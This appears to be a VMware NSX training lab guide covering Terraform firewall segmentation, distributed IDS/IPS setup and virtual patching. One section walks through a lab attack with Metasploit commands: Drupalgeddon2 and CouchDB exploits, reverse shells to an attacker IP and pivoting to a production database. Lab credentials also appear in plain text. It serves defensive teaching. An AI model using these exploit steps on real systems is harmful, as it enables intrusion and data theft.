<p><img src="https://media.screensteps.com/image_assets/assets/004/048/707/medium/f0f4b35d-889f-4658-9e6a-b84a8ac084f6.png" alt="" /></p>
<h2 id="2-apply-edge-firewall-segmentation-via-terraform"><a class="header" href="#2-apply-edge-firewall-segmentation-via-terraform">2. Apply Edge Firewall Segmentation via Terraform</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/244/original/d699fd43-e0a5-4f6e-a6e0-b363fa13fb3e.png" alt="" /></p>
<p>SSh to ubuntu-utils using Putty. Credentials are livefire/VMware1!</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/206/568/medium/792b4eaa-c086-40f1-80da-ed4adc8e35e6.png" alt="" /></p>
<p>Clone Github repository via the command <code>git clone https://github.com/nsxlivefire/vcnlivefire-v1</code></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/254/original/77267bf8-138b-4de8-87fd-629c9628efd4.png" alt="" /></p>
<ol>
<li>Create a new directory named terraform via the command <code>mkdir terraform</code></li>
<li>Navigate to the terraform directory via the command  <code>cd terraform/</code></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/206/570/original/543c97e0-4e7b-4ceb-bea7-276cdb11d1bb.png" alt="" /></p>
<ol>
<li>Copy the terraform file describing the edge firewall configuration from the repository directory to the current directory via the command: <code>cp ../vcnlivefire-v1/zone_based_efw.tf ./</code></li>
<li>Verify the file has been copied via the command <code>ls</code></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/533/medium/d9ec6704-9a82-46bf-9342-af0bacc9d45c.png" alt="" /></p>
<ol>
<li>run the following command: <strong>cat zone_based_efw.tf,</strong> this will provide you with the contents of the terraform configuration file that we will be executing.</li>
<li>As we are interacting with NSX-T our provider is nsxt, with the associated details to connect to the NSX Manager</li>
<li>We have two data sources that are exported, which will be consumed in the remainder of the terraform configuration file
<ol>
<li>The first is a t1 gateway called &quot;T1-INTERNAL&quot; - this is the object within NSX, which we then export to a local name &quot;t1-internal&quot;</li>
<li>The second is the grouping object, &quot;MGMT&quot;, which is exported to a local name &quot;mgmt&quot;</li>
</ol>
</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/539/medium/a25b6dc5-edc8-48bd-a010-39e47cb1f6c2.png" alt="" /></p>
<p>Next we declare a number of resources that we are going to create:</p>
<ol>
<li>An NSX group called DMZ, which matches segments that have the dmz tag, and scope of zone, associated with them</li>
<li>An NSX group called Internal, which matches segments that have the internal tag, and scope of zone, associated with them</li>
<li>A firewall service object called couchdb, which is mapped to TCP 5984</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/544/original/52a48cd8-ec59-4c5d-a2c0-3d1b2fe37c9a.png" alt="" /></p>
<p>Finally, we have a single firewall policy resource defined, which has number of rules defined within it. This is the macro segmentation firewall policy.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/250/medium/1c3ef2e4-ae61-4358-8d46-787ec9e74ac7.png" alt="" /></p>
<ol>
<li>Run <code>terraform init</code>  to install the required vmware/nsxt v3.1.0 terraform provider. We are now ready to apply our configuration.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/256/original/f94166bd-01a7-42e2-a7fb-176467d16e1e.png" alt="" /></p>
<ol>
<li>Run the command <strong>terraform apply</strong> to configure the edge firewall segmentation in NSX</li>
</ol>
<p>Terraform will show you the proposed changes before proceeding.  You can inspect them.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/075/981/medium/8021f6ff-da85-4f92-8312-cbecfd5bd75e.png" alt="" /></p>
<ol>
<li>Confirm that you want to apply the changes</li>
</ol>
<p>Terraform will apply the configuration and you can verify the result from the CLI output. A succesfull configuration will show: <strong>Apply complete! Resources: 4 added, 0 changed, 0 destroyed</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/549/original/7b35fa4a-8bd0-4c20-a459-8ae4a9c7f074.png" alt="" /></p>
<ol>
<li>Run the command: <strong>cat terraform.tfstate</strong></li>
<li>When you apply the configuration terraform maintains state information of it's actions, and saves it in the tfstate file. Browse this file, and become familiar with it.</li>
</ol>
<p><strong>Note:</strong> You should never edit the tfstate files directly.</p>
<h2 id="3-verify-edge-firewall-configuration-in-the-nsx-ui"><a class="header" href="#3-verify-edge-firewall-configuration-in-the-nsx-ui">3. Verify Edge Firewall Configuration in the NSX UI</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/462/original/f2daa863-1f37-4ab8-9df0-468c791cf3a8.png" alt="" /></p>
<ol>
<li>In Chrome, navigate to the <strong>NSX Manager UI</strong> bokmark in the RegionA folder</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/452/original/71449ed2-6a2a-4a60-9146-16c4ecc58529.png" alt="" /></p>
<ol>
<li>Click LOG IN</li>
</ol>
<p>Credentials are cached. In case you need them, use admin/VMware1!VMware1!</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/454/medium/cd3f0e78-ade9-47ad-8def-9be4ff00765a.png" alt="" /></p>
<ol>
<li>Select the <strong>Security</strong> tab</li>
<li>Click on <strong>Gateway Firewall</strong></li>
<li>Select the <strong>T1-INTERNAL</strong> Gateway in the drop down menu</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/802/medium/9a8cf310-e6c8-4723-9fe8-0bde32ec5157.png" alt="" /></p>
<ol>
<li>Expand the Gateway Firewall Policy named <strong>Macro Segmentation for Internal Zone</strong> you created via Terraform.</li>
</ol>
<p>Note the direct access form the external network is not allowed, and access from the DMZ is only allowed on the couchdb service port (TCP 5984). Management IP ranges, including your windows jump host have full access to the Internal network.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/450/original/29290fcc-599e-4efa-a529-29b06c62a32e.png" alt="" /></p>
<ol>
<li>Clicking on a group (i.e. MGMT) you have access to information about how the group has been defined, and the effective group members.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/466/original/1d111ad6-f75f-41b4-b73b-2757e0e12fdf.png" alt="" /></p>
<ol>
<li>Select <strong>Effective Members</strong></li>
<li>Select <strong>IP Addresses</strong>, you can see the two management IPs that have full access to the Internal Network</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/460/original/3f98ac4e-f507-4eea-98b3-61e148a0fc22.png" alt="" /></p>
<ol>
<li>Select <strong>Group Definition</strong></li>
<li>Select <strong>IP Addresses</strong>, you can see that the group has been configured to explicitly include two IP addresses. Because those IPs represent systems outside of the NSX domain this was the only option available.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/464/original/e34014ec-0d29-47bc-a6dc-b6b173820009.png" alt="" /></p>
<ol>
<li>Select now the DMZ Group</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/472/medium/9df51699-cfec-435b-8567-15e8a291e6c0.png" alt="" /></p>
<ol>
<li>Select <strong>Group Definition</strong>. You can see that this group has been defined via a dynamic criteria to inclue any Virtual Machine residing on segments tagged with zone|dmz scope|value pair.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/470/original/ec15603c-b8ca-4120-869c-f2b79e78bbb7.png" alt="" /></p>
<ol>
<li>Select Effective Members</li>
<li>Select Segments. You can see that the OV-DMZ segment is part of the group based on the tag that was applied to it as part of the lab pre-configuration.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/456/original/d4973eca-0aa4-4221-9d49-0e1753744bb4.png" alt="" /></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/275/original/8f33bdcd-e5e7-4875-bbc3-9f62807ac5ac.png" alt="" /></p>
<p>The Segment Ports and IP Addresses tab have additional information about the effective members of the group.</p>
<h2 id="4-increase-the-granularity-of-gateway-firewall-rules"><a class="header" href="#4-increase-the-granularity-of-gateway-firewall-rules">4. Increase the Granularity of Gateway Firewall Rules</a></h2>
<p>The internal network hosts two databases. We want to give the DMZ access to the dev database only (172.16.60.11), and we want to avoid that systems exposed to the Internet can interact with the production database (172.16.60.12).</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/800/original/18b60ea4-af99-4ccf-9a87-f0cf263d0da2.png" alt="" /></p>
<ol>
<li>Hover over the Any in the Destination filed for the Allow DMZ rule, and click on the <strong>pencil button</strong> to edit</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/963/564/medium/171b6c88-cec7-4e10-99bf-2f4cd5399f00.png" alt="" /></p>
<ol>
<li>Select the IP Addresses tab</li>
<li>Type <strong>172.16.60.11/32</strong> and hit <strong>enter</strong></li>
<li>Click <strong>Apply</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/804/original/9a41181c-b8df-40d9-8bbb-6164040740fa.png" alt="" /></p>
<ol>
<li><strong>Publish</strong> the changes</li>
</ol>
<h2 id="a-hrefvcnlivefireuctilise-terraform-to-apply-edge-firewall-ruleshtmlverify-segmentation-via-trace-flowa5-verify-segmentation-via-trace-flow"><a class="header" href="#a-hrefvcnlivefireuctilise-terraform-to-apply-edge-firewall-ruleshtmlverify-segmentation-via-trace-flowa5-verify-segmentation-via-trace-flow"><a href="vcn/livefire/uctilise-terraform-to-apply-edge-firewall-rules.html#verify-segmentation-via-trace-flow"></a>5. Verify Segmentation via Trace Flow</a></h2>
<h3 id="a-hrefvcnlivefireuctilise-terraform-to-apply-edge-firewall-ruleshtmldmz-to-dev-dba51-dmz-to-dev-db"><a class="header" href="#a-hrefvcnlivefireuctilise-terraform-to-apply-edge-firewall-ruleshtmldmz-to-dev-dba51-dmz-to-dev-db"><a href="vcn/livefire/uctilise-terraform-to-apply-edge-firewall-rules.html#dmz-to-dev-db"></a>5.1. DMZ to DEV DB</a></h3>
<p><img src="https://media.screensteps.com/image_assets/assets/003/964/086/original/126a4331-b7d1-4d58-b334-813f5e62c8b2.png" alt="" /></p>
<ol>
<li>Select the <strong>Plan and Troubleshoot</strong> tab</li>
<li>Click on <strong>Traceflow</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/964/094/medium/8a74e978-4523-4f07-9474-81872941ecdc.png" alt="" /></p>
<ol>
<li>Select <strong>TCP</strong> as the Protocol Type</li>
<li>Set a random source port such as <strong>10000</strong></li>
<li>Set the destination port to <strong>5984</strong> (couchdb service port)</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/152/423/medium/7d795222-b22b-472e-949f-18df60a45c6f.png" alt="" /></p>
<ol>
<li>Select <strong>drupal-dev</strong> as the source VM</li>
<li>Select <strong>couchdb-dev</strong> as the destination VM</li>
<li>Click <strong>TRACE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/152/425/medium/edc2c781-9f93-4acb-a106-c96a6c6d0ebd.png" alt="" /></p>
<ol>
<li>Note the topology map describing the path the synthetic packet has taken from the VM in the DMZ to the VM on the INternal network</li>
<li>Note that the packet has been delivered, it means our gateway firewall rules allowed the traffic as we expected</li>
</ol>
<p>Optionally you can inspect the path taken by the packet as observed at every observation point.</p>
<h3 id="a-hrefvcnlivefireuctilise-terraform-to-apply-edge-firewall-ruleshtmldmz-to-prod-dba52-dmz-to-prod-db"><a class="header" href="#a-hrefvcnlivefireuctilise-terraform-to-apply-edge-firewall-ruleshtmldmz-to-prod-dba52-dmz-to-prod-db"><a href="vcn/livefire/uctilise-terraform-to-apply-edge-firewall-rules.html#dmz-to-prod-db"></a>5.2. DMZ to PROD DB</a></h3>
<p><img src="https://media.screensteps.com/image_assets/assets/003/964/092/medium/0d72a8f2-b4da-48be-85fe-d733bdf14082.png" alt="" /></p>
<ol>
<li>Click <strong>EDIT</strong></li>
<li>Click <strong>PROCEED</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/964/098/original/5ed3810a-f716-4497-bdc1-8b702b5587cb.png" alt="" /></p>
<ol>
<li>Change the destination VM to <strong>couchdb-prd</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/152/427/medium/969bf432-b512-42c9-82e7-db40d9d8ace0.png" alt="" /></p>
<ol>
<li>Click <strong>TRACE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/277/original/7f0f9e12-4c3e-47a3-8f4c-a62228f8964f.png" alt="" /></p>
<ol>
<li>Note that the packet is <strong>dropped</strong> in this case</li>
<li>Trace Flow provide information about the firewall rule dropping the traffic</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/279/medium/b43e82c0-6db6-4dce-9994-57ad868633c8.png" alt="" /></p>
<p>To see the rule with that specific ID ( in my case 5099):</p>
<ol>
<li>Select the <strong>Security</strong> tab</li>
<li>Select <strong>Edge Firewall</strong></li>
<li>Select the <strong>T1-INTERNAL</strong> Logical Router</li>
<li>The ID will match the deny any any rule of the <strong>Macro Segmentation for Internal Zone</strong> Policy</li>
</ol>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="21-enable-nsx-intrusion-prevention-system-ids"><a class="header" href="#21-enable-nsx-intrusion-prevention-system-ids">2.1 Enable NSX Intrusion Prevention System (IDS)</a></h1>
<h2 id="1-overview-1"><a class="header" href="#1-overview-1">1. Overview</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/071/287/medium/c6a0324b-3ca7-4f98-ad80-70cacc290d14.png" alt="" /></p>
<p>In this section, we will enable the NSX IDS on both the DMZ and internal zones.  The IDS will not stop eventual attacks, but it should trigger an alert visible in the NSX UI or the IPS logs. We will use the default IPS profile. The default IPS profile triggers an alert for the IPS events of the highest severity: Critical. We will perform the configuration of the IDS rules via the API.</p>
<h2 id="2-steps"><a class="header" href="#2-steps">2. Steps</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/964/448/medium/fa86037e-3934-4876-83d7-27be03b1f5e4.png" alt="" /></p>
<ol>
<li>Select the <strong>Security</strong> tab</li>
<li>Click on <strong>Distributed IDS/IPS</strong></li>
<li>Click on <strong>GET STARTED</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/964/452/medium/22903352-d9e8-4acd-b86e-69599a9cce23.png" alt="" /></p>
<ol>
<li>Check to be in the Settings tab</li>
<li>Toggle the switch to Enable <strong>Intrusion Detection</strong> and <strong>Prevention</strong> for Cluster-01a</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/964/450/original/5d72df74-90ad-43c2-8189-9f7a7bd65087.png" alt="" /></p>
<ol>
<li>Click <strong>YES</strong> to confirm</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/077/076/original/b2ff04ea-1964-45a6-a054-56c1fa760caa.png" alt="" /></p>
<ol>
<li>Navigate to the <strong>profile</strong> tab</li>
<li>Click <strong>ADD PROFILE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/077/072/medium/08373e14-3fa2-4786-880c-f7eb6f47ce77.png" alt="" /></p>
<ol>
<li>Type <strong>IDS-PROFILE</strong> in the name field (<strong>It's case sensitive</strong> as we are going to use this object in a API call in the next step. If you type it wrong, you have to delete it and recreate it!!)</li>
<li>Note that all signatures are included</li>
<li>Click <strong>SAVE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/964/467/medium/3545c4c0-b9c3-484b-b729-7b9614e6a472.png" alt="" /></p>
<ol>
<li>Navigate to the <strong>RULES</strong> tab</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/206/596/medium/b6dbbf0d-c9a2-4f0b-b440-11e84fe5254f.png" alt="" /></p>
<p>From the ubuntu-utlis server, run the command:</p>
<p><code>curl -k --user 'admin:VMware1!VMware1!' -H 'Content-Type: application/json' --request PATCH 'https://nsxmgr-01a/policy/api/v1/infra' --data '@/home/livefire/vcnlivefire-v1/ids.json'</code></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/077/074/medium/27487732-84fa-4c68-ac17-c3b3342b442d.png" alt="" /></p>
<ol>
<li>Click <strong>REFRESH</strong></li>
<li>Expand the <strong>IDS</strong> Policy</li>
</ol>
<p>You should see the IDS rules created by our Policy API call</p>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="22-perform-multi-stage-attack-leveraging-software-vulnerabilities"><a class="header" href="#22-perform-multi-stage-attack-leveraging-software-vulnerabilities">2.2 Perform Multi-Stage Attack Leveraging Software Vulnerabilities</a></h1>
<h2 id="1-overview-2"><a class="header" href="#1-overview-2">1. Overview</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/048/820/medium/59d95012-0586-4b14-a897-154924e1d696.png" alt="" /></p>
<p>In this section, we will impersonate a fictitious attacker aiming to exfiltrate critical data stored in the production database residing in the internal zone. The production database is not directly accessible from the attacker's workstation. For this reason, we will have to perform a multi-stage attack where we will initially exploit less critical components to find a path to the &quot;crown jewels&quot; of our company. When the attack is complete, we will look at the IDS events to see if they reveal information about the attacker's behavior.</p>
<p>The initial step will be to perform an attack on the vulnerable development drupal server sitting in the DMZ. The system is not patched and exposes a known vulnerability. The attacker will exploit it to create a reverse shell session to its workstation. Via that session, the attacker can perform additional discovery and attack activity.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/048/824/medium/e2a72552-4b54-41d4-843d-391de4c0ce4b.png" alt="" /></p>
<p>Once the attacker controls the drupal development server in the DMZ, she will start a port scan via NMAP to figure out what other systems are reachable from there. Because of the edge firewall segmentation, we implemented the production database is not discovered. The attacker can recognize the development database's presence in the internal zone, though, and might decide to attack it to pivot to a different network.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/048/818/medium/2850f7e8-4790-43ab-a3ad-c2e80411cc76.png" alt="" /></p>
<p>The attacker, leveraging a vulnerability in the development database server, can establish an additional reverse shell session. At this point, the attacker is in full control of two systems in our environment.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/048/822/medium/8b608cf6-be6e-48f8-863a-a21a58c220a2.png" alt="" /></p>
<p>The last stage of the attack will consist of taking control of the production database server. The production database runs the same code as the development one, so the attacker can exploit it via the same mechanisms. Because the development and production databases sit in the same network, the attacker can use the reverse shell session to the development server to initiate an attack on the production database. Once that is completed, the attacker can exfiltrate data from the production database via the established reverse shell session.</p>
<h2 id="2-exploit-vulnerability-on-the-drupal-server-in-the-dmz"><a class="header" href="#2-exploit-vulnerability-on-the-drupal-server-in-the-dmz">2. Exploit vulnerability on the Drupal Server in the DMZ</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/232/original/ab9dd551-628d-4f8e-ae7d-2c5b95e887b9.png" alt="" /></p>
<p>SSH to the <strong>attacker-01a</strong> VM. credentials are vmware/VMware1!</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/238/original/19fa46ff-b180-4106-9af3-483f438458b5.png" alt="" /></p>
<p>Start the Metasploit console via the command <code>sudo msfconsole</code></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/236/original/e1303e1e-64a6-4b56-8131-e82f097c887c.png" alt="" /></p>
<p>Select the dupalgeddon2 exploit module via the command <code>use exploit/unix/webapp/drupal_drupalgeddon2</code></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/878/original/0dfeda08-3b14-4629-8cce-ae2a63d181e3.png" alt="" /></p>
<ol>
<li>Set the IP of the targeted victim, the drupal-dev VM in the DMZ, via the command  <code>set RHOST 172.16.70.11</code></li>
<li>Set the port where the vulnerable drupal service is running on the victim VM via the command <code>set RPORT 8080</code></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/812/original/ef235692-e1ab-4ecb-a815-19dcb067e3fa.png" alt="" /></p>
<p>Start the exploit via the command <code>exploit</code></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/240/medium/c677b04b-133d-48ce-8c51-c39b851ac822.png" alt="" /></p>
<ol>
<li>You can use <code>sysinfo</code> or other meterpreter commands to retrive information about the exploited system</li>
<li>Send the session to the background via the <code>background</code> command</li>
</ol>
<h2 id="3-pivot-to-internal-network"><a class="header" href="#3-pivot-to-internal-network">3. Pivot to Internal Network</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/230/original/da0c7934-0d4f-44f0-80f4-2056fefc6cbf.png" alt="" /></p>
<p>Install a static route to the internal network subnet via the session 1 we put in the background via the command  <code>route add 172.16.60.0/24 1</code>.  The attacker VM will use the established session to the vulnerable system in the DMZ to reach the internal network.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/076/105/medium/5bb439db-a973-4e28-99e3-22b17f5124cb.png" alt="" /></p>
<ol>
<li>Initialize the tcp scanner module via the command <code>use auxiliary/scanner/portscan/tcp</code></li>
<li>Set the range of IP to be scanned via the command <code>set RHOSTS 172.16.60.0/28</code></li>
<li>Set the TCP port t scan with the command <code>set PORTS 5984</code></li>
<li>Run the scan via the command <code>run</code></li>
<li>Note that only the dev couchdb is reachable. The production couchdb with IP 172.16.60.12 is not reachable from the DMZ network</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/456/medium/90f815ce-c781-4436-85ab-8b2218f3086d.png" alt="" /></p>
<ol>
<li>prepare the use of the apache_couchdb exploit via the command <code>use exploit/linux/http/apache_couchdb_cmd_exec</code></li>
<li>Set the victim ip with the command <code>set RHOST 172.16.60.11</code></li>
<li>Set the listening IP (Attacker VM IP) for the reverse shell session  <code>set LHOST 192.168.100.5</code></li>
<li>Set  the listening port for the reverse shell session <code>set LPORT 4445</code></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/460/medium/b59f1c30-a275-4c2c-b6fa-18562b5c7569.png" alt="" /></p>
<ol>
<li>Run the exploit via the command <code>exploit</code></li>
<li>Type background to send the session to the <code>background</code></li>
<li>Confirm by typing <strong>y</strong></li>
</ol>
<h2 id="4-attack-the-production-database"><a class="header" href="#4-attack-the-production-database">4. Attack the production Database</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/814/medium/9c39ae54-efcc-4fc9-936d-be0034bfa575.png" alt="" /></p>
<p>List the current sessions via the command <code>sessions -l</code></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/458/medium/71d56cb8-415f-4f23-9713-6015dc576c08.png" alt="" /></p>
<ol>
<li>Use the shell_to_meterpreter module to upgrade the reverse shell session to couchdb-dev via the command <code>use multi/manage/shell_to_meterpreter</code> . We need it to route traffic to the production DB via that session</li>
<li>Set the local port for the new upgraed session via the command <code>set LPORT 8081</code></li>
<li>Set the session to upgrade via the command  <code>set session 2</code></li>
<li>Run the exploit via the command <code>exploit</code></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/816/medium/79a731cb-5945-43c6-a283-6821220963b0.png" alt="" /></p>
<p>Running the command <code>sessions -l</code> , you can now see an additional metepreter session between the dev couchdb and the attacker VM.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/076/955/original/00c1b3e9-7fa9-4d14-a694-e49f70812b2b.png" alt="" /></p>
<p>Instruct metasploit to use the new session (3) to reach the production database of IP 172.16.60.12. Use the command  <code>route add 172.16.60.12/32 3</code></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/966/448/medium/d9351a71-3b1f-466a-9386-9083a94441f2.png" alt="" /></p>
<ol>
<li>prepare the use of the apache_couchdb exploit via the command <code>use exploit/linux/http/apache_couchdb_cmd_exec</code></li>
<li>Set the victim ip with the command <code>set RHOST 172.16.60.12</code></li>
<li>Set the listening IP (Attacker VM IP) for the reverse shell session  <code>set LHOST 192.168.100.5</code></li>
<li>Set  the listening port for the reverse shell session <code>set LPORT 4446</code></li>
<li>Run the exploit via the command <code>exploit</code></li>
<li>Type background to send the session to the <code>background</code></li>
<li>Confirm by typing <strong>y</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/818/medium/bfec8079-6c4b-4f35-85d5-652591cf7a20.png" alt="" /></p>
<p>Via the command <code>sessions -l</code> , you can see that we now have a reverse shell open to the production database server.</p>
<h2 id="5-visualize-events-in-the-nsx-ids"><a class="header" href="#5-visualize-events-in-the-nsx-ids">5. Visualize Events in the NSX IDS</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/079/149/medium/5716f57e-2fff-44a4-9305-e7584404e13c.png" alt="" /></p>
<ol>
<li>Navigate to the <strong>EVENTS</strong> tab, in the Distributed IDS/IPS section</li>
<li>You should see one critical and 3 high severity events.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/820/medium/3a43bfcc-da81-4923-aacb-e97a9fcc8590.png" alt="" /></p>
<ol>
<li>Expand the event with &quot;Product Affected&quot; <strong>drupal_server</strong></li>
<li>Note the attacker IP</li>
<li>Note the IP of the drupal-dev VM in the DMZ</li>
<li>Note direction of the attack and traffic flow</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/822/medium/f30d8962-89eb-4c4f-b966-fed0dac8a3f2.png" alt="" /></p>
<ol>
<li>Identify the event related to the <strong>apache_couchdb</strong></li>
<li>Click on the counter for the VMs Affected, <strong>3</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/079/137/original/37b33b5e-6d69-4305-b578-38da238586e0.png" alt="" /></p>
<ol>
<li>Note that all the 3 VMs are considered involved in the attack</li>
<li>Click <strong>CLOSE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/079/141/medium/1391b59b-9c45-401d-809d-f529184135d8.png" alt="" /></p>
<ol>
<li>Expand the attack</li>
<li>Click on the <strong>Purple bar</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/824/medium/df853199-aca5-48c4-9c7c-685b0f9bc501.png" alt="" /></p>
<ol>
<li>Note the details about the attack</li>
<li>Click <strong>CLOSE</strong></li>
</ol>
<blockquote>
<p>If you want to try the lab again, you can clear the IPS events via this procedure:</p>
<p>SSH to NSX manager and log in as root (VMware1!VMware1!)</p>
<p>run this commands:</p>
<p><code>service idps-reporting-service stop</code></p>
<p><code>java -cp /usr/share/corfu/lib/corfudb-tools-3.1.20201022192550.7817.1-shaded.jar org.corfudb.browser.CorfuStoreBrowserMain --host=192.168.110.15 --port=9040 --tlsEnabled=true --keystore=/config/cluster-manager/corfu/private/keystore.jks --ks_password=/config/cluster-manager/corfu/private/keystore.password --truststore=/config/cluster-manager/corfu/public/truststore.jks --truststore_password=/config/cluster-manager/corfu/public/truststore.password --namespace=security_data_service --tablename=ids_event_data --operation=dropTable --diskPath=/tmp</code></p>
<p><code>curl -X PUT -H &quot;Content-Type: application/json&quot; &quot;localhost:9200/security_data_service_metadata/_doc/security_data_service?pretty&quot; -d' {&quot;clusterId&quot; : &quot;-1&quot;}'</code></p>
<p><code>service idps-reporting-service start</code></p>
<p>You will need to refresh the event tab a few times.</p>
</blockquote>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="23-use-nsx-ips-to-stop-attacks-to-vulnerable-applications"><a class="header" href="#23-use-nsx-ips-to-stop-attacks-to-vulnerable-applications">2.3 Use NSX IPS to Stop Attacks to Vulnerable Applications</a></h1>
<h2 id="1-overview-3"><a class="header" href="#1-overview-3">1. Overview</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/048/854/medium/594110cf-8d2f-4ddf-a57b-aa96acd077f9.png" alt="" /></p>
<p>The objective of this section is to prevent the initial attack on the Internet exposed vulnerable drupal server. The server is running a known vulnerable version of the drupal software. The best course of action would be to patch the server, but because the application owner is currently running validation tests for a new product launch on that server, they do not want to have any down time until next month.</p>
<p>The security team can provide virtual patching for the drupal-dev virtual machine. We can create a dedicated IPS profile that blocks only the attacks that exploit the VM's vulnerability. We can granularly apply the IPS profile only to the affected VM. In this way, we limit the risk of accidentally blocking desired traffic matching signatures that are not relevant to the workload. If the IPS was centrally placed in the network, we could not follow this approach.</p>
<h2 id="2-create-ips-profile-for-the-exposed-drupal-server-in-the-dmz"><a class="header" href="#2-create-ips-profile-for-the-exposed-drupal-server-in-the-dmz">2. Create IPS Profile for the exposed Drupal server in the DMZ</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/079/411/original/d39d8c19-17c8-4c37-b9f5-87698daf2cc2.png" alt="" /></p>
<ol>
<li>Select the <strong>Profiles</strong> tab</li>
<li>Click on <strong>ADD PROFILE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/079/417/medium/f52acaa3-cc9b-4c6d-8165-7c8bdb3bb0a2.png" alt="" /></p>
<ol>
<li>Type <strong>IPS-DRUPAL</strong> in the name field</li>
<li>Click on <strong>Select</strong> for Products Affected</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/851/original/eb63f036-ef48-409e-8143-90dd261e4368.png" alt="" /></p>
<ol>
<li>Type drupal in the filter box</li>
<li>Select the <strong>drupal server</strong> Product Affected Name</li>
<li>Click <strong>SAVE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/079/418/medium/7aa23ccb-c3ca-46e5-8a75-1d25c33c8665.png" alt="" /></p>
<p>In our screenshot we now see only 4 signatures are included in this profile. 4 of high severity, and 1 of low severity. In your lab this may differ due to recent signature updates.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/079/413/original/3c4ec157-d414-4b76-8c29-3b2309282627.png" alt="" /></p>
<ol>
<li>Deselect the <strong>Low</strong> priority Signature group</li>
<li>Click on <strong>Manage signatures for this profile</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/857/medium/976f11a9-bea2-4bc9-afdf-fa4002fd0710.png" alt="" /></p>
<ol>
<li>Change the Action for all the signatures to <strong>Drop</strong></li>
<li>Click <strong>APPLY</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/079/420/original/95e5ba55-e6c7-4528-ab37-1b80daf8c66e.png" alt="" /></p>
